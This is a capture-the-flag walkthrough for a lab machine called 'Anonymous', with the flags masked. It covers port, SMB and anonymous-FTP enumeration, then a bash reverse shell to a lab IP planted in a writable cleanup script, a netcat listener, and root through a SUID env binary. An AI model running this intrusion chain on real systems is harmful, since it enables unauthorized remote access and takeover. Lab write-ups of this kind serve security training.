# Anonymous
**Difficulty:** Medium  

---

## Questions and Answers
- Enumerate the machine. How many ports are open? → `***`  
- What service is running on port 21? → `***`  
- What service is running on ports 139 and 445? → `***`  
- There's a share on the user's computer. What's it called? → `***`  
- user.txt → `********************************`  
- root.txt → `********************************`  

---

## Full Walkthrough

### Nmap Enumeration
```bash
nmap -sC -sV 10.201.24.55 -oN nmap_anonymous

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 19:51 WIB
Nmap scan report for 10.201.24.55
Host is up (0.37s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|_    220 NamelessOne's FTP Server!
22/tcp  open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn?
445/tcp open  microsoft-ds?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```
## SMB Enumeration
```bash
smbclient -L //10.201.24.55 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
```

## FTP Enumeration
```bash
ftp 10.201.24.55

Connected to 10.201.24.55.
220 NamelessOne's FTP Server!
Name (10.201.24.55:santstyle): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||8763|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||31675|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2279 Sep 09 13:20 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> mget *
mget clean.sh [anpqy?]? y
229 Entering Extended Passive Mode (|||29056|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |*********************************************************************|   314        2.72 MiB/s    00:00 ETA
226 Transfer complete.
mget removed_files.log [anpqy?]? y
229 Entering Extended Passive Mode (|||57126|)
150 Opening BINARY mode data connection for removed_files.log (2365 bytes).
100% |*********************************************************************|  2365       25.62 MiB/s    00:00 ETA
226 Transfer complete.
mget to_do.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||19274|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |*********************************************************************|    68        0.55 KiB/s    00:00 ETA
226 Transfer complete.
```
`to_do.txt`
```
I really need to disable the anonymous login...it's really not safe
```
`clean.sh` (original):
```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
## Weaponization
Modify `clean.sh` to include reverse shell:
```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
/bin/bash -i >& /dev/tcp/10.9.1.148/1337 0>&1
```
Upload back:
```bash
ftp> put clean.sh
```
## Exploitation
Start listener:
```bash
nc -lvnp 1337

listening on [any] 1337 ...
connect to [10.9.1.148] from (UNKNOWN) [10.201.24.55] 44418
sh: 0: can't access tty; job control turned off
$ ls
pics
user.txt
$ whoami
namelessone
$ cat user.txt
********************************
```
`Yeyy we get the user.txt`

## Next

Upgrade shell:
```bash
$ python -c "import pty; pty.spawn('/bin/bash')"
namelessone@anonymous:~$ ^Z
zsh: suspended  nc -lvnp 1337
stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               export TERM=xterm
namelessone@anonymous:~$ 
```
List SUID binaries:
```bash
namelessone@anonymous:~$ find / -type f -perm /4000 2>/dev/null
...
/usr/bin/env
...
```
Privilege escalation via GTFOBins:
```bash
namelessone@anonymous:~$ env /bin/sh -p
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
********************************
```
Conclusion

+ Anonymous FTP access led to discovery of writable script.

+ Modified script executed reverse shell, gaining user access as namelessone.

+ Privilege escalation via SUID env → full root.

+ Both flags obtained.